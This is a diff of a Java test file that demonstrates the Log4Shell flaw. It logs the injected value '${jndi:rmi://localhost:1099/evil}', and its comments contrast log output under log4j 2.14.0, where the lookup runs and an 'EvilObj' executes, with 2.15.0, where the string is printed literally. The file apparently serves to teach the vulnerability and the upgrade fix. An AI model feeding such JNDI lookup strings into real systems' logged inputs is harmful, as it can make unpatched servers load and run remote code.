@@ -23,15 +23,14 @@ public class Log4j2Test {
         LOGGER.info("Hello {}!", username);
 
         /*
-            Use log4j 2.14.0 version, the printed log:
+            When we use log4j 2.14.0 version, the logs are as below:
 
             16:59:41.709 [main] INFO  com.boyuan.Log4j2Test - Hello Mac OS X 10.12.6 unknown, architecture: x86_64-64!
             16:59:41.712 [main] INFO  com.boyuan.Log4j2Test - Hello Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode)!
 
-            Use log4j 2.15.0 version, the printed log:
-
-            00:47:23.043 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:os}!
-            00:47:23.045 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:vm}!
+            Executing EvilObj...
+            (Some exceptions may be thrown)
+            17:21:08.427 [main] INFO  com.boyuan.Log4j2Test - Hello ${jndi:rmi://localhost:1099/evil}!
         */
 
         username = "${jndi:rmi://localhost:1099/evil}";
@@ -39,7 +38,11 @@ public class Log4j2Test {
         LOGGER.info("Hello {}!", username);
 
         /*
-            Executing EvilObj...
+            After upgrading to log4j 2.15.0 version, the logs are as below:
+
+            17:17:25.026 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:os}!
+            17:17:25.028 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:vm}!
+            17:17:25.029 [main] INFO  com.boyuan.Log4j2Test - Hello ${jndi:rmi://localhost:1099/evil}!
          */
     }
 
